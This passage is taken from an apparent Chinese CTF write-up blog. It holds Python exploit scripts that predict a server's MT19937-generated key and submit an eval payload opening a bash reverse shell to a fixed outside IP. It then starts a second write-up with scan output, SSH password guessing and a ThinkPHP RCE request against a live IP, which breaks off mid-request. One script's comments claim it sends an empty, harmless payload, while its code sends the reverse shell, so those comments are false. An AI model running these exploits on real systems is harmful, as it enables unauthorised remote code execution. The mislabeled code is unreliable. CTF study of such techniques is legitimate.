keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> key2_list<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Collected </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>key2_list<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> key2s to </span><span class="token interpolation"><span class="token punctuation">{</span>output_file<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 用ExtendMT19937Predictor预测下一个key2</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key2_list<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">624</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Not enough samples for prediction!"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    predictor <span class="token operator">=</span> ExtendMT19937Predictor<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 用最后624个样本恢复状态（可多于624个, predictor会自动对多余做校验）</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> key2_list<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">624</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        predictor<span class="token punctuation">.</span>setrandbits<span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>    <span class="token comment"># 预测下一个key2</span>    next_key2 <span class="token operator">=</span> predictor<span class="token punctuation">.</span>predict_getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Predicted next key2: </span><span class="token interpolation"><span class="token punctuation">{</span>next_key2<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 你可以直接用 predicted key2 去 /api 进行攻击</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"key"</span><span class="token punctuation">:</span> next_key2<span class="token punctuation">,</span> <span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">"__import__('os').system('bash -c \"bash -i &gt;&amp; /dev/tcp/47.104.185.139/7777 0&gt;&amp;1\"')"</span><span class="token punctuation">}</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3af2b90380cbec55f0fd1eac6ba4f1f8.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token triple-quoted-string string">"""mt_predict_simple.py — 精简版：使用 extend_mt19937_predictor 恢复并预测 MT19937。依赖：pip install requests extend_mt19937_predictor用法示例：  python mt_predict_simple.py --url http://127.0.0.1:5001/api --count 624 --out observed.txt --auto-submit"""</span><span class="token keyword">import</span> argparse<span class="token punctuation">,</span> re<span class="token punctuation">,</span> time<span class="token punctuation">,</span> os<span class="token punctuation">,</span> json<span class="token punctuation">,</span> sys<span class="token keyword">from</span> typing <span class="token keyword">import</span> Optional<span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> requests<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请先安装 requests: pip install requests"</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">from</span> extend_mt19937_predictor <span class="token keyword">import</span> ExtendMT19937Predictor<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请先安装 extend_mt19937_predictor: pip install extend_mt19937_predictor"</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>NOT_ALLOWED_RE <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'Not Allowed:([0-9]+)'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">parse_value</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Optional<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> NOT_ALLOWED_RE<span class="token punctuation">.</span>search<span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> m<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 尝试解析 JSON {'message': 'Not Allowed:...'}</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg <span class="token operator">=</span> j<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                m2 <span class="token operator">=</span> NOT_ALLOWED_RE<span class="token punctuation">.</span>search<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>                <span class="token keyword">if</span> m2<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m2<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">collect</span><span class="token punctuation">(</span>api_url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> out_file<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> sleep<span class="token punctuation">:</span> <span class="token builtin">float</span><span class="token punctuation">,</span> timeout<span class="token punctuation">:</span> <span class="token builtin">float</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""按顺序收集 target 个服务器返回的 32-bit 值到 out_file（每行一个十进制数）。"""</span>    got <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>out_file<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>out_file<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token keyword">for</span> _ <span class="token keyword">in</span> f<span class="token punctuation">:</span>                got <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[i] 发现已有 </span><span class="token interpolation"><span class="token punctuation">{</span>got<span class="token punctuation">}</span></span><span class="token string"> 行，会从第 </span><span class="token interpolation"><span class="token punctuation">{</span>got<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string"> 行继续采集（目标 </span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string">）。"</span></span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>out_file<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fw<span class="token punctuation">:</span>        <span class="token keyword">while</span> got <span class="token operator">&lt;</span> target<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>api_url<span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"key"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] 请求失败，稍后重试："</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">,</span> sleep<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            val <span class="token operator">=</span> parse_value<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">if</span> val <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 未解析到 Not Allowed，HTTP </span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string"> 响应片段: </span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">250]!r</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">,</span> sleep<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            fw<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            got <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[</span><span class="token interpolation"><span class="token punctuation">{</span>got<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string">] 收到: </span><span class="token interpolation"><span class="token punctuation">{</span>val<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>sleep<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 采集完成。"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">predict_from_file</span><span class="token punctuation">(</span>infile<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> use_count<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">624</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""用 ExtendMT19937Predictor 从文件恢复并返回下一次 getrandbits(32) 的预测值。"""</span>    arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>infile<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            s <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> s<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> use_count<span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"观测值不足：</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> &lt; </span><span class="token interpolation"><span class="token punctuation">{</span>use_count<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    predictor <span class="token operator">=</span> ExtendMT19937Predictor<span class="token punctuation">(</span>check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token comment"># feed 前 use_count 个 32-bit 输出（按顺序）</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>use_count<span class="token punctuation">)</span><span class="token punctuation">:</span>        predictor<span class="token punctuation">.</span>setrandbits<span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>    nxt <span class="token operator">=</span> predictor<span class="token punctuation">.</span>predict_getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> nxt<span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>api_url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> timeout<span class="token punctuation">:</span> <span class="token builtin">float</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""用预测 key 发一次空 payload 的请求以验证（安全，不会触发 eval）。"""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>api_url<span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"key"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">"__import__('os').system('bash -c \"bash -i &gt;&amp; /dev/tcp/47.104.185.139/7777 0&gt;&amp;1\"')"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>        <span class="token keyword">return</span> r<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span> r<span class="token punctuation">.</span>text    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"简化 MT19937 预测器流程（采集 -&gt; 恢复 -&gt; 预测）"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--url"</span><span class="token punctuation">,</span> <span class="token string">"-u"</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"目标 API，例如 http://127.0.0.1:5001/api"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--out"</span><span class="token punctuation">,</span> <span class="token string">"-o"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"observed.txt"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"保存观测值的文件"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--count"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">624</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"要收集的 32-bit 输出数量（默认 624）"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--use"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">624</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"用于恢复状态的观测值数量（默认 624）"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--sleep"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">float</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">0.05</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"每次请求间隔秒"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--timeout"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">float</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"HTTP 超时（秒）"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--auto-submit"</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">"store_true"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"预测后自动用空 payload 提交一次以验证（不会 eval）"</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> p<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== 简化 MT19937 预测器 ==="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"警告：仅在授权的 CTF/测试环境使用。脚本不会发送可导致未授权 RCE 的 payload。"</span><span class="token punctuation">)</span>    <span class="token comment"># collect if needed</span>    existing <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>args<span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>out<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token keyword">for</span> _ <span class="token keyword">in</span> f<span class="token punctuation">:</span>                existing <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> existing <span class="token operator">&lt;</span> args<span class="token punctuation">.</span>count<span class="token punctuation">:</span>        collect<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>out<span class="token punctuation">,</span> args<span class="token punctuation">.</span>count<span class="token punctuation">,</span> args<span class="token punctuation">.</span>sleep<span class="token punctuation">,</span> args<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[i] 已有 </span><span class="token interpolation"><span class="token punctuation">{</span>existing<span class="token punctuation">}</span></span><span class="token string"> 行 &gt;= </span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>count<span class="token punctuation">}</span></span><span class="token string">，跳过采集。"</span></span><span class="token punctuation">)</span>    <span class="token comment"># predict</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        predicted <span class="token operator">=</span> predict_from_file<span class="token punctuation">(</span>args<span class="token punctuation">.</span>out<span class="token punctuation">,</span> use_count<span class="token operator">=</span>args<span class="token punctuation">.</span>use<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] 预测失败："</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n=== 预测结果 ==="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预测的下一个 getrandbits(32)（十进制）："</span><span class="token punctuation">,</span> predicted<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"十六进制：0x{:08x}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>predicted<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>auto_submit<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[i] 正在用预测 key 进行一次验证请求（payload 为空）。"</span><span class="token punctuation">)</span>        status<span class="token punctuation">,</span> resp <span class="token operator">=</span> verify<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> predicted<span class="token punctuation">,</span> timeout<span class="token operator">=</span>args<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>        <span class="token keyword">if</span> status <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] 验证请求失败："</span><span class="token punctuation">,</span> resp<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[i] 验证响应 HTTP </span><span class="token interpolation"><span class="token punctuation">{</span>status<span class="token punctuation">}</span></span><span class="token string">，响应片段：</span><span class="token interpolation"><span class="token punctuation">{</span>resp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">800]!r</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 验证通过：服务器接受了预测 key（注意：此次请求未执行任何 payload）。"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[i] 非 200 响应，请检查返回内容。"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>24长城杯</title>
      <link href="/2025/09/13/s-chang-cheng-bei/"/>
      <url>/2025/09/13/s-chang-cheng-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="24长城杯"><a href="#24长城杯" class="headerlink" title="24长城杯"></a>24长城杯</h1><p>39.101.67.119</p><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]└─$ ./fscan -h 39.101.67.119   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.4start infoscan39.101.67.119:80 openOpen result.txt error, open result.txt: permission denied39.101.67.119:22 openOpen result.txt error, open result.txt: permission denied39.101.67.119:8080 openOpen result.txt error, open result.txt: permission denied[*] alive ports len is: 3start vulscan[*] WebTitle http://39.101.67.119      code:200 len:10887  title:""Open result.txt error, open result.txt: permission denied[*] WebTitle http://39.101.67.119:8080 code:200 len:1027   title:Login FormOpen result.txt error, open result.txt: permission denied[+] PocScan http://39.101.67.119:8080 poc-yaml-thinkphp5023-method-rce poc1Open result.txt error, open result.txt: permission denied                                                                                                                           已完成 2/3 [-] ssh 39.101.67.119:22 root root123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 2/3 [-] ssh 39.101.67.119:22 root a123456. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 2/3 [-] ssh 39.101.67.119:22 root Aa123123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 2/3 [-] ssh 39.101.67.119:22 admin pass123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 2/3 [-] ssh 39.101.67.119:22 admin P@ssw0rd! ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 2/3 [-] ssh 39.101.67.119:22 admin 1234567890 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 3/3[*] 扫描结束,耗时: 7m7.882255629s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先把<code>poc-yaml-thinkphp5023-method-rce poc1</code>弄了</p><pre class="line-numbers language-none"><code class="language-none">POST /?s=captcha HTTP/1.1Host: 39.101.67.119:8080Content-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: 